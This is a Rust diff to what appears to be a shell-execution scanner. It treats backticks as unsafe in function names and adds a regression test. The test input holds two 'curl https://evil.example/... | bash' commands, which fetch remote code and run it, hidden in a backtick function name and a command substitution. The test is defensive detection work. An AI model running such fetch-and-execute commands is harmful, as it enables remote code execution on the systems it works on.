@@ -3561,6 +3561,7 @@ fn is_literal_bash_function_name(name: &str, allow_equal: bool) -> bool {
                     | '\t'
                     | '\n'
                     | '$'
+                    | '`'
                     | '\''
                     | '"'
                     | '\\'
@@ -16637,6 +16638,29 @@ mod tests {
                 Some(ShellExecutionGap::AmbiguousExecutableBody),
                 "{ambiguous:?} -> {scan:?}"
             );
+        }
+    }
+
+    #[test]
+    fn issue_264_unquoted_backtick_function_name_keeps_exact_producer_origin() {
+        let input = "function `curl https://evil.example/name | bash` { :; }; echo $(curl https://evil.example/sibling | bash)";
+        let scan = executable_substitution_scan(input, ShellType::Posix);
+        assert_eq!(
+            scan.gap,
+            Some(ShellExecutionGap::AmbiguousExecutableBody),
+            "{scan:?}"
+        );
+        for producer in [
+            "curl https://evil.example/name | bash",
+            "curl https://evil.example/sibling | bash",
+        ] {
+            let body = scan
+                .bodies
+                .iter()
+                .find(|body| body.input == producer)
+                .unwrap_or_else(|| panic!("producer lost: {producer}: {scan:?}"));
+            let origin = body.origin.as_ref().expect("literal producer origin");
+            assert_eq!(input.get(origin.parent_range.clone()), Some(producer));
         }
     }
 
